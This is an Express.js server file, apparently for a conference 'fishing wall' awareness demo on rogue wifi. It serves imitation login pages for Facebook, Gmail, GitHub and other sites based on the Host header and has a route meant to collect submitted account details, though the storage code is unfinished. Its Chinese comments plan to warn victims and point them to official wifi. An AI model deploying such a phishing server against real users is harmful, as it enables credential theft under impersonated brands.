const express = require('express');
const app = express();
const port = 5001

// Receive the account information from fishing sites.
app.get('/fish', function(request, response){
    // TODO: Get account information and store into the coressponding json file according to gmail account.
    
    
    // Redirect to introduction page.
    response.redirect('introduction')
});

// Introduce hitcon fishing wall.
app.get('/introduction', function(request, response){
    // TODO: 科普惡意 wifi 的危害以及辨認方法
    // TODO: 告知綿羊這個 wifi 不會偷其他的東西，並且綿羊牆是匿名的，請綿羊放心
    // TODO: 請他去連官方提供的 wifi
    // TODO: 告知他釣魚牆的相關資訊，e.g. 位置、釣魚牆統計資料
    response.sendFile('front-end/index.html', {root: '../'});
    //response.sendFile('front-end/introduction/index.html', {root: '../'});
});

// Receive flags.
app.get('/flag', function(request, response){
    // TODO (optional): Get flag from frontend and store into the corresponding json file.
});

// Display all fishing sites.
app.all('*', function(request, response){
    // TODO: Redirect to fishing sites based on the request url.
    const host = request.headers.host
    console.log(host)
    if (host.includes('facebook')){
        response.sendFile('front-end/facebook/index.html', {root: '../'});
    }
    else if (host.includes('gmail')){
        response.sendFile('front-end/gmail/index.html', {root: '../'});
    }
    else if (host.includes('twitter')){
        response.sendFile('front-end/twitter/index.html', {root: '../'});
    }
    else if (host.includes('github')){
        response.sendFile('front-end/github/index.html', {root: '../'});
    }
    else if (host.includes('linkedin')){
        response.sendFile('front-end/linkedin/index.html', {root: '../'});
    }
    else if (host.includes('instagram')){
        response.sendFile('front-end/instagram/index.html', {root: '../'});
    }
    else if (host.includes('hackmd')){
        response.sendFile('front-end/hackmd/index.html', {root: '../'});
    }
    else{
        response.sendFile('front-end/hitcon/index.html', {root: '../'});
    }
});

app.listen(port, () => {
    console.log(`listening on port ${port}`)
})